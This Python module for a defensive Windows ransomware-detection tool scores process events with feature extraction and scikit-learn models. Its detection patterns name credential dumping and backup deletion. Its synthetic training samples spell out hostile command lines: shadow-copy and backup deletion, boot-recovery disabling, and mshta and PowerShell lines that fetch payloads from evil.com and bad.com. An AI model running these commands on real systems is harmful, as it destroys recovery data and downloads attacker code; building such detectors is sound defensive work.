"""
Module 6: ML Anomaly Scorer
============================
Lightweight ML layer that augments rule-based scoring with anomaly detection.
Uses scikit-learn (no GPU, no heavy deps) — stays well under 50MB memory.

PHILOSOPHY:
- Complements, never overrides, the rule engine
- Feature extraction from process telemetry (no file I/O, no network)
- Two models:
    1. IsolationForest  — unsupervised anomaly on process behavior vectors
    2. GradientBoosting — supervised classifier (trained on labeled examples)
- Output: ml_score (0-100), ml_confidence, model_used
- Falls back gracefully if sklearn not installed

DESIGN CONSTRAINTS:
- No kernel drivers
- No full EDR imitation
- No heavy telemetry
- Pure Python, runs on Windows 10/11
- Memory: <20MB model footprint
- Latency: <5ms per event
"""

import json
import logging
import pickle
import os
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict

logger = logging.getLogger("MLScorer")

# ---------------------------------------------------------------------------
# Feature extraction
# ---------------------------------------------------------------------------

# Scoring weights for feature extraction
PROCESS_RISK_SCORES = {
    "vssadmin.exe": 90,
    "bcdedit.exe": 85,
    "wbadmin.exe": 85,
    "diskshadow.exe": 80,
    "cipher.exe": 70,
    "fsutil.exe": 65,
    "wmic.exe": 50,
    "powershell.exe": 30,
    "pwsh.exe": 30,
    "cmd.exe": 20,
    "certutil.exe": 45,
    "bitsadmin.exe": 45,
    "mshta.exe": 60,
    "rundll32.exe": 55,
    "regsvr32.exe": 55,
    "net.exe": 25,
    "sc.exe": 30,
    "reg.exe": 35,
    "taskkill.exe": 40,
    "icacls.exe": 50,
    "takeown.exe": 50,
}

CRITICAL_CMDLINE_PATTERNS = [
    ("delete shadows", 95),
    ("shadowcopy delete", 95),
    ("recoveryenabled no", 90),
    ("bootstatuspolicy ignoreallfailures", 90),
    ("delete catalog", 88),
    ("delete backup", 85),
    ("mimikatz", 95),
    ("sekurlsa", 95),
    ("lsass", 80),
    ("comsvcs.dll minidump", 90),
    ("-encodedcommand", 60),
    ("-enc ", 55),
    ("frombase64string", 65),
    ("invoke-expression", 55),
    ("-windowstyle hidden", 60),
    ("-noprofile", 40),
    ("net stop", 45),
    ("sc stop", 45),
    ("net view \\\\", 55),
    ("psexec", 75),
    ("wmic /node", 70),
    ("downloadstring", 70),
    ("downloadfile", 70),
    ("invoke-webrequest", 65),
    ("curl ", 40),
    ("cipher /w", 75),
]

SUSPICIOUS_PARENTS = {
    "winword.exe": 80,
    "excel.exe": 80,
    "powerpnt.exe": 75,
    "acrord32.exe": 70,
    "outlook.exe": 70,
    "acrobat.exe": 70,
    "chrome.exe": 50,
    "firefox.exe": 50,
    "msedge.exe": 50,
    "iexplore.exe": 55,
}


def extract_features(event: Dict) -> List[float]:
    """
    Extract numeric feature vector from a process event dict.
    
    Feature vector (16 dimensions):
    [0]  process_risk_score       — known risky process name (0-100)
    [1]  cmdline_max_risk         — max risk from cmdline patterns (0-100)
    [2]  cmdline_pattern_count    — number of suspicious patterns matched
    [3]  parent_risk_score        — parent process risk (0-100)
    [4]  has_lolbin               — bool: process is a LOLBin
    [5]  has_obfuscation          — bool: encoding/obfuscation present
    [6]  has_shadow_delete        — bool: shadow copy deletion command
    [7]  has_boot_manip           — bool: boot config modification
    [8]  has_backup_delete        — bool: backup deletion
    [9]  has_cred_dump            — bool: credential dumping
    [10] has_lateral_move         — bool: lateral movement
    [11] has_service_stop         — bool: service stop/disable
    [12] rule_score               — passed-through rule engine score (0-100)
    [13] rule_level_num           — rule level as number (0=low,1=med,2=high,3=crit)
    [14] hour_of_day              — 0-23, anomalous if outside 8-18
    [15] is_after_hours           — bool: outside 8AM-6PM
    """
    proc = (event.get("process_name") or "").lower()
    cmdline = (event.get("command_line") or "").lower()
    parent = (event.get("parent_process_name") or "").lower()
    tags = event.get("tags") or []
    rule_score = float(event.get("ransomware_score") or event.get("total_score") or 0)
    level = event.get("level") or event.get("confidence") or "low"
    
    LOLBINS = {
        "powershell.exe", "pwsh.exe", "cmd.exe", "wmic.exe", "mshta.exe",
        "rundll32.exe", "regsvr32.exe", "certutil.exe", "bitsadmin.exe",
        "cscript.exe", "wscript.exe"
    }
    
    level_map = {"low": 0, "medium": 1, "high": 2, "critical": 3}
    
    # Feature 0: process risk
    proc_risk = PROCESS_RISK_SCORES.get(proc, 5) / 100.0
    
    # Features 1-2: cmdline patterns
    matched_risks = []
    for pattern, risk in CRITICAL_CMDLINE_PATTERNS:
        if pattern in cmdline:
            matched_risks.append(risk)
    cmdline_max_risk = max(matched_risks, default=0) / 100.0
    cmdline_pattern_count = min(len(matched_risks), 10) / 10.0
    
    # Feature 3: parent risk
    parent_risk = SUSPICIOUS_PARENTS.get(parent, 0) / 100.0
    
    # Boolean features
    has_lolbin = float(proc in LOLBINS)
    has_obfuscation = float(any(p in cmdline for p in ["-enc", "-encodedcommand", "frombase64", "invoke-expression", "-w hidden"]))
    has_shadow_delete = float("delete shadows" in cmdline or "shadowcopy delete" in cmdline)
    has_boot_manip = float("recoveryenabled no" in cmdline or "bootstatuspolicy" in cmdline)
    has_backup_delete = float("delete catalog" in cmdline or "delete backup" in cmdline or "wbadmin delete" in cmdline)
    has_cred_dump = float(any(p in cmdline for p in ["mimikatz", "sekurlsa", "lsass", "minidump"]))
    has_lateral = float(any(p in cmdline for p in ["psexec", "wmic /node", "winrm", "invoke-command"]))
    has_svc_stop = float("net stop" in cmdline or "sc stop" in cmdline or "sc config" in cmdline)
    
    # Temporal
    try:
        ts = event.get("timestamp", "")
        if ts:
            dt = datetime.fromisoformat(ts[:19])
            hour = dt.hour
        else:
            hour = 12
    except Exception:
        hour = 12
    
    hour_norm = hour / 23.0
    is_after_hours = float(hour < 8 or hour >= 18)
    
    # Rule score passthrough
    rule_score_norm = min(rule_score, 100) / 100.0
    rule_level_norm = level_map.get(level, 0) / 3.0
    
    return [
        proc_risk,
        cmdline_max_risk,
        cmdline_pattern_count,
        parent_risk,
        has_lolbin,
        has_obfuscation,
        has_shadow_delete,
        has_boot_manip,
        has_backup_delete,
        has_cred_dump,
        has_lateral,
        has_svc_stop,
        rule_score_norm,
        rule_level_norm,
        hour_norm,
        is_after_hours,
    ]


# ---------------------------------------------------------------------------
# Training data (synthetic labeled samples)
# ---------------------------------------------------------------------------

SYNTHETIC_TRAINING_DATA = [
    # label=1 (malicious)
    {"process_name": "vssadmin.exe", "command_line": "vssadmin delete shadows /all /quiet", "parent_process_name": "cmd.exe", "tags": ["shadow_copy_deletion"], "ransomware_score": 20, "level": "high", "timestamp": "2025-01-15T03:12:00"},
    {"process_name": "bcdedit.exe", "command_line": "bcdedit /set {default} recoveryenabled no", "parent_process_name": "cmd.exe", "tags": ["boot_manipulation"], "ransomware_score": 20, "level": "high", "timestamp": "2025-01-15T03:13:00"},
    {"process_name": "wbadmin.exe", "command_line": "wbadmin delete catalog -quiet", "parent_process_name": "cmd.exe", "tags": ["backup_deletion"], "ransomware_score": 18, "level": "high", "timestamp": "2025-01-15T03:14:00"},
    {"process_name": "powershell.exe", "command_line": "powershell.exe -enc VGVzdA== -windowstyle hidden -noprofile", "parent_process_name": "winword.exe", "tags": ["obfuscated_execution"], "ransomware_score": 15, "level": "medium", "timestamp": "2025-01-15T02:30:00"},
    {"process_name": "wmic.exe", "command_line": "wmic shadowcopy delete", "parent_process_name": "cmd.exe", "tags": ["shadow_copy_deletion"], "ransomware_score": 20, "level": "critical", "timestamp": "2025-01-15T03:15:00"},
    {"process_name": "net.exe", "command_line": "net stop vss & net stop sql", "parent_process_name": "cmd.exe", "tags": ["service_manipulation"], "ransomware_score": 8, "level": "medium", "timestamp": "2025-01-15T03:10:00"},
    {"process_name": "cipher.exe", "command_line": "cipher /w:c:\\", "parent_process_name": "cmd.exe", "tags": ["encryption_activity"], "ransomware_score": 15, "level": "high", "timestamp": "2025-01-15T03:20:00"},
    {"process_name": "certutil.exe", "command_line": "certutil.exe -decode payload.b64 payload.exe", "parent_process_name": "powershell.exe", "tags": ["download_activity"], "ransomware_score": 10, "level": "medium", "timestamp": "2025-01-15T02:00:00"},
    {"process_name": "mshta.exe", "command_line": "mshta.exe javascript:a=(GetObject('script:http://evil.com/x.sct')).exec()", "parent_process_name": "outlook.exe", "tags": ["document_spawned_process"], "ransomware_score": 12, "level": "medium", "timestamp": "2025-01-15T14:35:00"},
    {"process_name": "wmic.exe", "command_line": "wmic /node:192.168.1.10 process call create cmd.exe", "parent_process_name": "cmd.exe", "tags": ["lateral_movement"], "ransomware_score": 12, "level": "high", "timestamp": "2025-01-15T03:25:00"},
    {"process_name": "powershell.exe", "command_line": "powershell invoke-expression (new-object net.webclient).downloadstring('http://bad.com/payload.ps1')", "parent_process_name": "excel.exe", "tags": ["download_activity", "obfuscated_execution"], "ransomware_score": 20, "level": "high", "timestamp": "2025-01-15T01:45:00"},
    {"process_name": "vssadmin.exe", "command_line": "vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB", "parent_process_name": "cmd.exe", "tags": ["shadow_copy_deletion", "backup_manipulation"], "ransomware_score": 22, "level": "critical", "timestamp": "2025-01-15T03:30:00"},
    # label=0 (benign)
    {"process_name": "powershell.exe", "command_line": "powershell.exe Get-Process", "parent_process_name": "explorer.exe", "tags": ["interactive_shell"], "ransomware_score": 0, "level": "low", "timestamp": "2025-01-15T10:00:00"},
    {"process_name": "cmd.exe", "command_line": "cmd.exe /c dir", "parent_process_name": "explorer.exe", "tags": ["interactive_shell"], "ransomware_score": 0, "level": "low", "timestamp": "2025-01-15T09:30:00"},
    {"process_name": "net.exe", "command_line": "net use Z: \\\\server\\share", "parent_process_name": "explorer.exe", "tags": ["system_utility"], "ransomware_score": 0, "level": "low", "timestamp": "2025-01-15T08:15:00"},
    {"process_name": "wmic.exe", "command_line": "wmic os get caption", "parent_process_name": "cmd.exe", "tags": ["system_utility"], "ransomware_score": 0, "level": "low", "timestamp": "2025-01-15T11:00:00"},
    {"process_name": "certutil.exe", "command_line": "certutil -hashfile file.exe SHA256", "parent_process_name": "cmd.exe", "tags": ["system_utility"], "ransomware_score": 0, "level": "low", "timestamp": "2025-01-15T14:00:00"},
    {"process_name": "reg.exe", "command_line": "reg query HKLM\\Software", "parent_process_name": "cmd.exe", "tags": ["system_utility"], "ransomware_score": 0, "level": "low", "timestamp": "2025-01-15T09:45:00"},
    {"process_name": "powershell.exe", "command_line": "powershell.exe -File backup_script.ps1", "parent_process_name": "svchost.exe", "tags": ["interactive_shell"], "ransomware_score": 0, "level": "low", "timestamp": "2025-01-15T02:00:00"},
    {"process_name": "sc.exe", "command_line": "sc query WinDefend", "parent_process_name": "cmd.exe", "tags": ["system_utility"], "ransomware_score": 0, "level": "low", "timestamp": "2025-01-15T10:30:00"},
]

SYNTHETIC_LABELS = [
    1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,  # malicious
    0, 0, 0, 0, 0, 0, 0, 0,               # benign
]


# ---------------------------------------------------------------------------
# ML Scorer class
# ---------------------------------------------------------------------------

@dataclass
class MLScore:
    ml_score: float          # 0.0 – 1.0 anomaly score
    ml_score_pct: int        # 0 – 100 for display
    ml_confidence: str       # low / medium / high
    model_used: str
    top_features: List[str]  # Human-readable top contributing features
    augmented_level: str     # Possibly elevated level

    def to_dict(self) -> dict:
        return asdict(self)


FEATURE_NAMES = [
    "process_risk", "cmdline_max_risk", "cmdline_pattern_count",
    "parent_risk", "is_lolbin", "has_obfuscation",
    "shadow_delete", "boot_manip", "backup_delete",
    "cred_dump", "lateral_move", "service_stop",
    "rule_score", "rule_level", "hour_of_day", "after_hours"
]

FEATURE_LABELS = {
    "shadow_delete": "Shadow copy deletion",
    "boot_manip": "Boot config manipulation",
    "backup_delete": "Backup deletion",
    "cred_dump": "Credential dumping",
    "lateral_move": "Lateral movement",
    "service_stop": "Service stop/disable",
    "has_obfuscation": "Command-line obfuscation",
    "process_risk": "High-risk process",
    "parent_risk": "Suspicious parent process",
    "cmdline_max_risk": "Dangerous command pattern",
    "is_lolbin": "Living-off-the-land binary",
    "rule_score": "High rule-based score",
    "after_hours": "After-hours execution",
}


class MLScorer:
    """
    Lightweight ML scorer. Trains on startup using synthetic data,
    or loads a saved model from disk if available.
    """

    MODEL_PATH = "ml_model.pkl"
    MIN_SKLEARN = True

    def __init__(self, model_path: str = "ml_model.pkl"):
        self.model_path = model_path
        self._model = None
        self._isolation = None
        self._trained = False
        self._sklearn_available = False

        try:
            import sklearn  # noqa
            self._sklearn_available = True
        except ImportError:
            logger.warning("scikit-learn not installed — ML scoring disabled (pip install scikit-learn)")
            return

        self._load_or_train()

    def _load_or_train(self):
        """Load existing model or train a fresh one."""
        if Path(self.model_path).exists():
            try:
                with open(self.model_path, "rb") as f:
                    bundle = pickle.load(f)
                self._model = bundle["classifier"]
                self._isolation = bundle["isolation"]
                self._trained = True
                logger.info(f"ML model loaded from {self.model_path}")
                return
            except Exception as e:
                logger.warning(f"Could not load model: {e}, retraining...")

        self._train()

    def _train(self):
        """Train on synthetic labeled data."""
        try:
            from sklearn.ensemble import GradientBoostingClassifier, IsolationForest
            from sklearn.preprocessing import StandardScaler
            from sklearn.pipeline import Pipeline

            X = [extract_features(e) for e in SYNTHETIC_TRAINING_DATA]
            y = SYNTHETIC_LABELS

            # Supervised classifier
            clf = Pipeline([
                ("scaler", StandardScaler()),
                ("gb", GradientBoostingClassifier(
                    n_estimators=50,
                    max_depth=3,
                    learning_rate=0.15,
                    random_state=42,
                ))
            ])
            clf.fit(X, y)

            # Unsupervised anomaly detector on ALL data (no labels needed)
            iso = IsolationForest(
                n_estimators=50,
                contamination=0.15,
                random_state=42
            )
            iso.fit(X)

            self._model = clf
            self._isolation = iso
            self._trained = True

            # Save
            try:
                with open(self.model_path, "wb") as f:
                    pickle.dump({"classifier": clf, "isolation": iso}, f)
                logger.info(f"ML model trained and saved to {self.model_path}")
            except Exception as e:
                logger.warning(f"Could not save model: {e}")

        except Exception as e:
            logger.error(f"ML training failed: {e}")
            self._trained = False

    def score(self, event: Dict, rule_level: str = "low") -> Optional[MLScore]:
        """
        Score a process event.
        
        Returns MLScore or None if ML is unavailable.
        """
        if not self._sklearn_available or not self._trained:
            return None

        try:
            features = extract_features({**event, "level": rule_level})
            feature_arr = [features]

            # Supervised probability
            gb_prob = self._model.predict_proba(feature_arr)[0][1]  # prob of malicious

            # Anomaly score (isolation forest: -1=anomaly, 1=normal → convert to 0-1)
            iso_raw = self._isolation.decision_function(feature_arr)[0]
            # Convert: more negative = more anomalous
            iso_score = max(0.0, min(1.0, 0.5 - iso_raw * 0.5))

            # Blend: 70% supervised + 30% unsupervised
            blended = 0.70 * gb_prob + 0.30 * iso_score
            blended = max(0.0, min(1.0, blended))

            # Confidence
            if blended >= 0.75:
                confidence = "high"
            elif blended >= 0.45:
                confidence = "medium"
            else:
                confidence = "low"

            # Top contributing features
            top_features = self._get_top_features(features)

            # Augmented level
            augmented_level = self._augment_level(rule_level, blended)

            return MLScore(
                ml_score=round(blended, 3),
                ml_score_pct=int(blended * 100),
                ml_confidence=confidence,
                model_used="GradientBoosting+IsolationForest",
                top_features=top_features,
                augmented_level=augmented_level,
            )

        except Exception as e:
            logger.error(f"ML scoring error: {e}")
            return None

    def _get_top_features(self, features: List[float]) -> List[str]:
        """Return human-readable labels for high-value features."""
        paired = list(zip(FEATURE_NAMES, features))
        # Sort by value desc, take top 3 that are meaningful
        high_features = [
            FEATURE_LABELS.get(name, name)
            for name, val in sorted(paired, key=lambda x: x[1], reverse=True)
            if val > 0.3 and name in FEATURE_LABELS
        ]
        return high_features[:3]

    def _augment_level(self, rule_level: str, ml_score: float) -> str:
        """
        Elevate severity level if ML score significantly exceeds rule score.
        Rule engine always wins on definitive indicators (>= HIGH).
        """
        level_order = ["low", "medium", "high", "critical"]
        rule_idx = level_order.index(rule_level) if rule_level in level_order else 0

        if ml_score >= 0.85 and rule_idx < 3:
            return level_order[min(rule_idx + 1, 3)]
        elif ml_score >= 0.65 and rule_idx < 2:
            return level_order[rule_idx + 1]

        return rule_level

    def retrain(self, new_samples: List[Dict], new_labels: List[int]):
        """Online retraining with new labeled samples."""
        global SYNTHETIC_TRAINING_DATA, SYNTHETIC_LABELS
        combined_data = SYNTHETIC_TRAINING_DATA + new_samples
        combined_labels = SYNTHETIC_LABELS + new_labels
        SYNTHETIC_TRAINING_DATA = combined_data
        SYNTHETIC_LABELS = combined_labels
        self._train()
        logger.info(f"Retrained on {len(combined_data)} samples")

    def is_available(self) -> bool:
        return self._sklearn_available and self._trained

    def get_stats(self) -> dict:
        return {
            "sklearn_available": self._sklearn_available,
            "model_trained": self._trained,
            "model_path": self.model_path,
            "training_samples": len(SYNTHETIC_TRAINING_DATA),
        }


# ---------------------------------------------------------------------------
# Module-level singleton
# ---------------------------------------------------------------------------

_scorer_instance: Optional[MLScorer] = None


def get_scorer() -> MLScorer:
    global _scorer_instance
    if _scorer_instance is None:
        _scorer_instance = MLScorer()
    return _scorer_instance


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

    scorer = MLScorer()
    if not scorer.is_available():
        print("Install scikit-learn: pip install scikit-learn")
        exit(1)

    print("=" * 60)
    print("ML Scorer — Self Test")
    print("=" * 60)

    tests = [
        {
            "name": "Shadow copy deletion (should be HIGH)",
            "event": {"process_name": "vssadmin.exe", "command_line": "vssadmin delete shadows /all /quiet", "parent_process_name": "cmd.exe", "ransomware_score": 20, "timestamp": "2025-01-15T03:12:00"},
            "rule_level": "high",
        },
        {
            "name": "Normal PowerShell (should be LOW)",
            "event": {"process_name": "powershell.exe", "command_line": "Get-Process", "parent_process_name": "explorer.exe", "ransomware_score": 0, "timestamp": "2025-01-15T10:00:00"},
            "rule_level": "low",
        },
        {
            "name": "After-hours encoded command (should be MEDIUM+)",
            "event": {"process_name": "powershell.exe", "command_line": "powershell -enc VGVzdA==", "parent_process_name": "winword.exe", "ransomware_score": 10, "timestamp": "2025-01-15T02:00:00"},
            "rule_level": "medium",
        },
    ]

    for t in tests:
        result = scorer.score(t["event"], t["rule_level"])
        if result:
            print(f"\n[{t['name']}]")
            print(f"  ML Score      : {result.ml_score_pct}%")
            print(f"  ML Confidence : {result.ml_confidence}")
            print(f"  Augmented     : {result.augmented_level}")
            print(f"  Top Features  : {result.top_features}")
